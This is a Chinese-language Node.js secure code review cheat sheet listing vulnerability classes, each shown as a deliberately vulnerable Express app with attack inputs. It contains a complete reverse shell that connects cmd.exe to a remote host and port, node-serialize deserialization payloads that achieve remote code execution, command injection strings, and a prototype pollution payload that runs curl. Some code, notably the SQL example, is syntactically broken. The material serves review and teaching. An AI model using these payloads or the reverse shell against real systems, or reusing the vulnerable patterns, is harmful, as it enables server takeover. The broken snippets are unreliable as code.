# Node JS Secure Code Review
```
npm install express --save
npm install body-parser --save
npm install cookie-parser --save
npm install multer --save


以上命令会将Express框架以及几个重要的模块一起安装在node_modules目录中，
node_modules目录下会自动创建express目录。几个重要的模块介绍如下：

body-parser - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。
cookie-parser - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。
multer - node.js 中间件，用于处理 enctype=”multipart/form-data”（设置表单的MIME编码）的表单数据。


express fingerprint:

HTTP response - X-Powered-By: Express
```

# Dangrous Functions

# Code Injection
```
重点关注eval、setInteval、setTimeout、new Function等函数的参数是否外部可控

var express = require('express');
var app = express();

var port = 8181;

app.get('/', function (req, res) {
        var a = eval(req.query.a);
        var b = eval(req.query.b);
        var r = a + b;
        res.send('Sum a+b=' + r);
})

console.log("App is listening on port: " + port);
app.listen(port);


?a=1&b=process.exit()
```
- Reverse Shell
```
function rev(host,port){
        var net = require('net');
        var cp  = require('child_process');
        var cmd = cp.spawn('cmd.exe', []);
        var client = new net.Socket();
        client.connect(port, host, function(){
                client.write('Connected\r\n'); client.pipe(cmd.stdin); cmd.stdout.pipe(client);
                cmd.stderr.pipe(client);
                client.on( 'exit', function(code,signal){ client.end('Disconnected\r\n'); } );
                client.on( 'error',function(e){ setTimeout( rev(host,port), 5000); })
        });
};
rev('192.168.10.137', 4444);
```
---
# Command Injection
```
关注child_process，exec

var express = require('express');
var cmd = require('child_process');
var app = express();

var port = 8888;

app.get('/cmd_injection', function (req, res) {
        cmd.exec("ping -n 4 " + req.query.ip, function(err,data){
                res.send('Ping Results: <pre>' + data + '</pre>');
        })
})

console.log("App is listening on port: " + port);
app.listen(port);

?ip=|whoami
?ip=127.0.0.1||whoami
```
# XSS
```
关注req.query 

var express = require('express');
var app = express();

var port = 8888;

app.get('/xss', function (req, res) {
        res.send('Hello, ' + req.query.name);
})

console.log("App is listening on port: " + port);
app.listen(port);


?name=[XSS payload]
```
# SSRF
 
```
var express = require('express');
var app = express();

var needle = require('needle');

var port = 8888;

app.get('/ssrf', function (req, res) {
        var url = req.query['url'];
        needle.get(url, function(error, response) {
                if (!error && response.statusCode == 200)
                        res.send(response.body);
        });
        console.log('new request:' + url);
})

console.log("App is listening on port: " + port);
app.listen(port);

?url=oob
app.use('/redirect', function(req, res) {
  request(req.query.url, function(error, response, body){
    if(err) {
      return res.send(body);
    }
  })
})
```

# HPP
```
Node.js有一个奇怪的特性，即允许一个参数有多个值。假设有一个参数叫做name，
给这个参数传递了多个值，最终name参数将包含这两个值，两个值之间用逗号隔开。
该特性可用来进行参数解析漏洞的利用。


var express = require('express');
var app = express();

var port = 8888;

app.get('/hpp', function (req, res) {
        var name = req.query.name;
        res.send("Name: " + name);
});

console.log("App is listening on port: " + port);
app.listen(port);

?name=chris&name=beach
```
# SQL Injection
```
var mysql = require ('mysql') ; 
var connection = mysql .createConnection(
{ host: 'localhost', 
user: 'root', 
password: 'root',
port: '3306', 
database: 'admin', }) ; 
connection.connect( ); 
var sql = 'select * from admin where id =?''; 
Var  param=[1];
connection.query( sql，param); 
connection.end( );

如果拼接会出现

// "id" 来自于未经处理的请求参数
db.query('select * from MyTable where id = ' + id);
   .then((users) => {
     // 在响应中返回用户信息
   });
```

# File Upload
```
Node.js的网站由于特有的路由规则，它的的上传问题虽然不像php、jsp、asp等脚本语言，
若攻击者上传若未经过滤的脚本，便可轻松的拿到shel。但是代码中若存在路径跳转漏洞，
攻击者可以直接将shell脚本木马上传到/etc/rc.d等启动项下面,
或者是直接上传相应的index.js文件覆盖到第三方模块express等目录下，
通过精心构造的js文件也能实现命令执行的目的。
```
- Code
```
var express = require('express');
var app = express();
var fs = require('fs');
var multer = require('multer');
app.use(multer({ dest: '/tmp/'}).array('image'));
app.use(express.static('public'));

var port = 8888;

app.post('/upload', function (req, res) {
        console.log(req.files[0]);  // 上传的文件信息
        var des_file = __dirname + '/' + req.files[0].originalname;
        fs.readFile( req.files[0].path, function (err, data) {
                fs.writeFile(des_file, data, function (err) {
                if( err ){
                        console.log( err );
                }else{
                        response = {
                                message:'File uploaded successfully',
                                filename:req.files[0].originalname
                        };
                }
                console.log( response );
                res.end( JSON.stringify( response ) );
                });
        });
});

console.log("App is listening on port: " + port);
app.listen(port);




<html>
<head>
<title>File</title>
</head>
<body>
Upload File: <br>
<form action="http://127.0.0.1:8888/upload" method="post" enctype="multipart/form-data">
<input type="file" name="image" size="50" />
<br>
<input type="submit" value="upload" />
</form>
</body>
</html>
Deserialization
http://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/

{\"rce\":\"_$$ND_FUNC$$_function(){ require('child_process').exec('calc')}()\"}

- serialize.js
var y = {
        function(){
                require('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });
        }
}
var s = require('node-serialize');
console.log("Serialized:\n" + s.serialize(y));
- Payload ( IIFE aka Immediately Invoked Function Expression ) 
(function(){ /* code /* }());
(function(){ /* code /* })();


(function() {
        require('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });
}());

// 或

(function() {
        require('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });
})();

```

- Exploit - 序列化时直接触发
```
要想在序列化时直接执行该函数，可以将代码修改如下：

var y = {
        poc : function(){
                require('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });
        }()
}
var s = require('node-serialize');
console.log("Serialized:\n" + s.serialize(y));
```
- Exploit - 反序列化时触发
```
1-正常payload反序列化后得到的是:

{"function":"_$$ND_FUNC$$_function(){\r\n\t\trequire('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });\r\n\t}"}

2-在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加()来构造即可:

{"function":"_$$ND_FUNC$$_function(){\r\n\t\trequire('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });\r\n\t}()"}

3-反序列化代码如下，unserialize.js:

var s = require('node-serialize');

var payload = '{"function":"_$$ND_FUNC$$_function(){\\r\\n\\t\\trequire(\'child_process\').exec(\'calc\', function(error, stdout, stderr){ console.log(stdout) });\\r\\n\\t}()"}'

s.unserialize(payload);
Prototype pollution
https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html
https://portswigger.net/web-security/prototype-pollution

{
    "__proto__": {
        "polluted": "function(){return require('child_process').execSync('curl dnslog')}"
    }
}
```
# dependency check
```
NSP 工具可以帮助检查第三方模块现有漏洞。

npm i nsp –g //安装nsp
nsp check 要检查的package.json //检查是否有漏洞
```
